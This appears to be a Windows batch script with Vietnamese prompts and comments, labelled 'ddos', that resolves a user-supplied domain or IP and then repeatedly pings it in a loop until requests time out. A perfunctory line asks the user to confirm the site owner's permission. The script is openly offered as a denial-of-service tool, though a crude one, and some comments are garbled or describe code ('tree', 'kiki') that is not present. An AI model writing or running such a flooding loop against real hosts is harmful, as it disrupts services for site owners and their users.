@echo off
setlocal enabledelayedexpansion        
echo    ¦¦¦¦¦¦¦¦+ ¦¦¦¦¦¦+  ¦¦¦¦¦¦+ ¦¦+     
echo    +--¦¦+--+¦¦+---¦¦+¦¦+---¦¦+¦¦¦     
echo        ¦¦¦   ¦¦¦   ¦¦¦¦¦¦   ¦¦¦¦¦¦     
echo        ¦¦¦   ¦¦¦   ¦¦¦¦¦¦   ¦¦¦¦¦¦     
echo        ¦¦¦   +¦¦¦¦¦¦+++¦¦¦¦¦¦++¦¦¦¦¦¦¦+
echo        +-+    +-----+  +-----+ +------+
echo ddos
echo Enter web domain hoac ip:
set /p domain=

:: Ki?m tra xem DNS có tr? v? k?t qu? hay không
nslookup %domain% > temp_result.txt 2>&1

findstr /i "Name:" temp_result.txt > nul
if %errorlevel% neq 0 (
    echo.
    echo ? Domain khong ton tai hoac khong the phan giai DNS.
    del temp_result.txt
    pause
    exit /b
)

:: Tìm IP trong k?t qu? và gán vào bi?n WEB_IP
for /f "tokens=2 delims=: " %%A in ('findstr /i "Address:" temp_result.txt') do (
    set WEB_IP=%%A
)

echo.
echo ? Domain hop le!
echo IP cua %domain% la: %WEB_IP%

del temp_result.txt
echo bam yes se tan cong ddos hãy chac rang ban dc chu web cho lam dieu do
set /p choice=Ban muon tiep tuc? (y/n): 

if /i "%choice%"=="y" (
    call :RunTreeLoop
    pause
    exit /b
)

if /i "%choice%"=="n" (
    echo Dang thoat...
    exit /b
)

REM Hàm chính
:RunTreeLoop
 :CheckCPU
REM L?y giá tr? CPU t? PowerShell và làm tròn xu?ng s? nguyên
for /f "usebackq" %%a in (`powershell -NoProfile -Command "(Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue"`) do (
    set /a CPU=%%a
)

REM Hi?n th? CPU hi?n t?i
echo CPU hi?n t?i: !CPU!%%

REM N?u CPU >= 99%, ch? t?i khi <= 30%
if !CPU! geq 99 (
    echo CPU !CPU!%% cao, dang ch?...
    goto WaitCPU
)

echo CPU dã xu?ng m?c an toàn: !CPU!%%

goto End

:WaitCPU
timeout /t 1 >nul
for /f "usebackq" %%a in (`powershell -NoProfile -Command "(Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue"`) do (
    set /a CPU=%%a
)
echo CPU hi?n t?i: !CPU!%%
if !CPU! gtr 30 goto WaitCPU

echo CPU dã xu?ng m?c an toàn: !CPU!%%

:End

    REM Ch?y tree và ki?m tra t? khóa "kiki"
    for /f "delims=" %%t in ('ping !WEB_IP!  /f /a') do (
        echo %%t
        echo %%t | find "Request timed out." >nul
        if !errorlevel! == 0 (
            echo completed
            exit /b
        )
    )

    REM Ki?m tra ESC (27)
    REM choice /t 1 /d y d? không ch?n, sau dó ki?m tra
    choice /n /c y /t 1 /d y >nul
    REM Không có cách don gi?n trong batch d? ki?m tra ESC tr?c ti?p, b? qua n?u mu?n
    REM goto RunTreeLoop ti?p t?c vòng l?p
goto RunTreeLoop
pause